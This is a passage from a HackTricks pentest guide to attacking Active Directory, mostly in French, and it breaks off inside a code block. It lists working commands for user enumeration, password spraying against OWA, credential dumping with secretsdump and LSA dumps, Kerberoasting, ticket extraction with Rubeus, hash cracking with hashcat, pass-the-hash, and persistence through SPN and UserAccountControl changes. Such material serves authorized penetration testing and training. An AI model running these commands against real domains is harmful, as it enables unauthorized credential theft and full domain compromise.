# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Aperçu de base

**Active Directory** sert de technologie fondamentale, permettant aux **network administrators** de créer et de gérer efficacement des **domains**, des **users** et des **objects** au sein d’un réseau. Il est conçu pour évoluer, facilitant l’organisation d’un grand nombre de users en **groups** et **subgroups** gérables, tout en contrôlant les **access rights** à différents niveaux.

La structure de **Active Directory** se compose de trois couches principales : **domains**, **trees** et **forests**. Un **domain** englobe un ensemble d’objects, tels que des **users** ou des **devices**, partageant une base de données commune. Les **trees** sont des groupes de ces domains reliés par une structure partagée, et une **forest** représente l’ensemble de plusieurs trees, interconnectés par des **trust relationships**, formant la couche la plus élevée de la structure organisationnelle. Des **access** et **communication rights** spécifiques peuvent être définis à chacun de ces niveaux.

Les concepts clés de **Active Directory** incluent :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne des entités dans le directory, notamment des **users**, des **groups** ou des **shared folders**.
3. **Domain** – Sert de conteneur pour les objets du directory, avec la possibilité pour plusieurs domains de coexister dans une **forest**, chacun conservant son propre ensemble d’objets.
4. **Tree** – Un regroupement de domains partageant un root domain commun.
5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs trees avec des **trust relationships** entre elles.

**Active Directory Domain Services (AD DS)** regroupe un ensemble de services essentiels pour la gestion centralisée et la communication au sein d’un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **users** et les **domains**, y compris les fonctions d’**authentication** et de **search**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion de **digital certificates** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications compatibles avec le directory via le **LDAP protocol**.
4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les users sur plusieurs applications web au cours d’une seule session.
5. **Rights Management** – Aide à protéger les contenus soumis au copyright en régulant leur distribution et leur utilisation non autorisées.
6. **DNS Service** – Crucial pour la résolution des **domain names**.

Pour une explication plus détaillée, voir : [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre comment **attack an AD**, vous devez **understand** très bien le **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour avoir un aperçu rapide des commandes que vous pouvez exécuter pour énumérer/exploiter un AD.

> [!WARNING]
> La communication Kerberos **requires a full qualifid name (FQDN)** pour effectuer des actions. Si vous essayez d’accéder à une machine via son adresse IP, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Si vous avez seulement accès à un environnement AD mais que vous n’avez aucune credentials/session, vous pourriez :

- **Pentest the network:**
- Scanner le réseau, trouver les machines et les ports ouverts, puis essayer d’**exploit vulnerabilities** ou d’**extract credentials** à partir d’eux (par exemple, [les printers peuvent être des cibles très intéressantes](ad-information-in-printers.md).
- L’énumération DNS peut donner des informations sur les serveurs clés du domaine, comme les serveurs web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour obtenir plus d’informations sur la manière de procéder.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions modernes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur la manière d’énumérer un serveur SMB se trouve ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur la manière d’énumérer LDAP se trouve ici (accordez une **attention particulière à l’accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Récupérer des credentials en [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accéder à l’hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Récupérer des credentials en **exposing** des [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
- Extraire des usernames/names à partir de documents internes, de réseaux sociaux, de services (principalement web) dans les environnements du domaine, ainsi que des sources publiques.
- Si vous trouvez les noms complets des employés de l’entreprise, vous pouvez essayer différentes conventions de **username AD (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chacun), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Lorsqu’un **invalid username is requested**, le serveur répond avec le code d’erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le username est invalide. Les **Valid usernames** provoqueront soit le **TGT in a AS-REP** response, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l’utilisateur doit effectuer une pré-authentication.
- **No Authentication against MS-NRPC**: Utilisation du auth-level = 1 (No authentication) contre l’interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après liaison à l’interface MS-NRPC afin de vérifier si l’utilisateur ou l’ordinateur existe sans aucune credentials. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’énumération. La recherche peut être consultée [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous avez trouvé un de ces serveurs dans le réseau, vous pouvez aussi effectuer une **énumération d’utilisateurs** contre lui. Par exemple, vous pouvez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateur dans [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, vous devriez avoir le **nom des personnes travaillant dans l'entreprise** à partir de l'étape de recon que vous auriez dû effectuer avant cela. Avec le nom et le prénom, vous pourriez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiellement valides.

### Knowing one or several usernames

Ok, donc vous savez déjà que vous avez un nom d'utilisateur valide mais aucun mot de passe... Alors essayez :

- [**ASREPRoast**](asreproast.md) : Si un utilisateur **n'a pas** l'attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur qui contiendra certaines données chiffrées par une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md) : Essayons les mots de passe les plus **courants** avec chacun des utilisateurs découverts, peut-être qu'un utilisateur utilise un mauvais mot de passe (gardez à l'esprit la politique de mot de passe !).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être en mesure d'**obtenir** des **hashes** de challenge à craquer en **poisoning** certains protocoles du **network** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si vous avez réussi à énumérer active directory, vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourriez être en mesure de forcer des **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  pour obtenir l'accès à l'environnement AD.

### NetExec workspace-driven recon & relay posture checks

- Utilisez les **workspaces `nxcdb`** pour conserver l'état de la recon AD par mission : `workspace create <name>` crée des bases de données SQLite par protocole sous `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et listez les secrets récupérés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.
- La découverte rapide du sous-réseau avec **`netexec smb <cidr>`** remonte le **domaine**, la **build OS**, les **exigences de signature SMB** et le **Null Auth**. Les membres affichant `(signing:False)` sont **relay-prone**, tandis que les DC exigent souvent la signature.
- Générez les **noms d'hôte dans /etc/hosts** directement à partir de la sortie NetExec pour faciliter le ciblage :
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Lorsque le **SMB relay vers le DC est bloqué** par le signing, sonde quand même la posture **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / un weak channel binding. Un DC avec SMB signing requis mais LDAP signing désactivé reste une cible viable de **relay-to-LDAP** pour des abus comme **SPN-less RBCD**.

### Fuites de credentials d’imprimante côté client → validation en masse des credentials de domaine

- Les interfaces web/imprimantes peuvent parfois **intégrer des mots de passe admin masqués dans le HTML**. Consulter le code source/devtools peut révéler le cleartext (par ex., `<input value="<password>">`), permettant un accès Basic-auth aux dépôts de scan/print.
- Les travaux d’impression récupérés peuvent contenir des **docs d’onboarding en plaintext** avec des mots de passe par utilisateur. Gardez les appariements alignés lors des tests :
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PCs ou shares** avec l'utilisateur **null ou guest** vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont accédés, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **steal** le **NTLM challenge** pour le casser:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** considère chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d'autres formats, plus lents, dont le matériel de clé est dérivé directement du NT hash. Au lieu de brute-force de longues passphrases dans des tickets Kerberos RC4, des challenges NetNTLM, ou des identifiants mis en cache, vous alimentez Hashcat avec les NT hashes dans les modes NT-candidate et laissez l'outil valider la réutilisation de mot de passe sans jamais apprendre le plaintext. C'est particulièrement puissant après une compromission de domaine où vous pouvez collecter des milliers de NT hashes actuels et historiques.

Utilisez le shucking quand:

- Vous avez un corpus NT issu de DCSync, de dumps SAM/SECURITY, ou de credential vaults et devez tester la réutilisation dans d'autres domaines/forests.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM, ou des blobs DCC/DCC2.
- Vous voulez prouver rapidement la réutilisation de longues passphrases impossibles à casser et pivoter immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le NT hash (par ex., Kerberos etype 17/18 AES). Si un domaine impose AES-only, vous devez revenir aux modes de mot de passe classiques.

#### Construire un corpus de NT hashes

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l'historique pour récupérer le plus grand ensemble possible de NT hashes (et leurs valeurs précédentes) :

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées d'historique élargissent énormément le pool de candidats, car Microsoft peut stocker jusqu'à 24 hashes précédents par compte. Pour plus de façons de collecter les secrets NTDS voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les logons de domaine mis en cache (DCC/DCC2). Dédupliquez et ajoutez ces hashes à la même liste `nt_candidates.txt`.
- **Suivre les métadonnées** – Conservez le username/domain qui a produit chaque hash (même si la wordlist ne contient que des hex). Les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
- Préférez les candidats du même forest ou d'un forest de confiance ; cela maximise les chances de recouvrement lors du shucking.

#### Modes NT-candidate de Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32 hex**. Désactivez les rule engines (pas de `-r`, pas de modes hybrides) car les transformations corrompent le matériel de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de clés NTLM (~30,000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT sélectionnée est bien moins coûteux que d'explorer tout l'espace de mots de passe dans le format lent.
- Utilisez toujours la **dernière version de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 sont apparus récemment.
- Il n'existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le plaintext password parce que leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, pas de NT hashes bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faible privilège (voir la page Kerberoast pour plus de détails) :

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckez le ticket avec votre liste NT :

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 à partir de chaque NT candidate et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos NT hashes existants.

3. Pivotez immédiatement via PtH :

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez éventuellement récupérer le plaintext plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Identifiants mis en cache (mode 31600)

1. Déversez les logons mis en cache depuis une workstation compromise :

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copiez la ligne DCC2 pour l'utilisateur de domaine intéressant dans `dcc2_highpriv.txt` et shuckez-la :

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Une correspondance réussie produit le NT hash déjà connu dans votre liste, prouvant que l'utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour retrouver la chaîne.

Le même workflow exact s'applique aux réponses challenge-response NetNTLM (`-m 27000/27100`) et à DCC (`-m 31500`). Une fois une correspondance identifiée vous pouvez lancer relay, SMB/WMI/WinRM PtH, ou casser à nouveau le NT hash avec des masks/rules hors ligne.



## Enumerating Active Directory WITH credentials/session

Pour cette phase vous devez avoir **compromis les credentials ou une session d'un compte de domaine valide.** Si vous avez des credentials valides ou un shell comme utilisateur de domaine, **vous devez vous rappeler que les options données avant restent des options pour compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée vous devez connaître le **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Avoir compromis un compte est une **grande étape pour commencer à compromettre tout le domaine**, car vous allez pouvoir commencer l'**Active Directory Enumeration:**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver chaque utilisateur potentiellement vulnérable, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les usernames** et essayer le mot de passe du compte compromis, les mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pourriez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus furtif
- Vous pouvez aussi [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil formidable pour la recon dans active directory est [**BloodHound**](bloodhound.md). Il n'est **pas très furtif** (selon les méthodes de collecte que vous utilisez), mais **si cela ne vous dérange pas**, vous devriez absolument l'essayer. Trouvez où les users peuvent faire du RDP, trouvez des chemins vers d'autres groupes, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer le directory est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi chercher dans la base LDAP avec **ldapsearch** pour trouver des credentials dans les champs _userPassword_ et _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pourriez aussi essayer des outils automatisés comme:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Il est très facile d'obtenir tous les usernames du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Enumeration paraît petite, c'est la partie la plus importante de toutes. Accédez aux liens (surtout ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à ce que vous soyez à l'aise. Pendant un assessment, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider que rien ne peut être fait.

### Kerberoast

Kerberoasting consiste à obtenir des **tickets TGS** utilisés par des services liés à des comptes utilisateur et à casser leur chiffrement — qui est basé sur les mots de passe utilisateur — **hors ligne**.

Plus d'informations à ce sujet dans :


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu quelques credentials vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter à plusieurs serveurs avec différents protocoles, selon vos port scans.

### Local Privilege Escalation

Si vous avez compromis des credentials ou une session comme utilisateur de domaine standard et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine dans le domaine** vous devriez essayer de trouver un moyen d'**escalader les privilèges localement et de looter des credentials**. C'est parce qu'uniquement avec des privilèges d'administrateur local vous pourrez **dump les hashes d'autres users** en mémoire (LSASS) et localement (SAM).

Il existe une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). N'oubliez pas non plus d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Il est très **improbable** que vous trouviez des **tickets** dans la session actuelle de l'user vous donnant la permission d'accéder à des ressources inattendues, mais vous pouvez vérifier:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer l'active directory, vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourriez être en mesure de forcer des **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Maintenant que vous avez quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés à l'intérieur de l'AD**. Vous pourriez le faire manuellement, mais c'est une tâche très ennuyeuse et répétitive (et encore plus si vous trouvez des centaines de docs que vous devez vérifier).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PCs ou shares**, vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont accessibles d'une manière ou d'une autre, vont t**rigger une authentification NTLM contre vous** afin que vous puissiez **steal** le **NTLM challenge** pour le craquer :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Pour les techniques suivantes, un simple utilisateur du domaine ne suffit pas ; vous avez besoin de privilèges/identifiants spéciaux pour réaliser ces attaques.**

### Hash extraction

En espérant que vous ayez réussi à **compromise some local admin** account en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) y compris le relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Puis, il est temps de dumper tous les hashes en mémoire et en local.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **l'usurper**.\
Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM à l'aide** de ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, afin que, lorsqu'une **authentification NTLM est effectuée**, **ce hash soit utilisé**. La dernière option est ce que fait mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique via le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou des valeurs de hash. Ce ticket volé est ensuite utilisé pour **usurper l'utilisateur**, obtenant ainsi un accès non autorisé aux ressources et services au sein d'un réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si vous avez le **hash** ou le **mot de passe** d'un **administrateur local**, vous devriez essayer de vous **connecter localement** à d'autres **PCs** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **bruyant** and **LAPS** would **mitiger** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
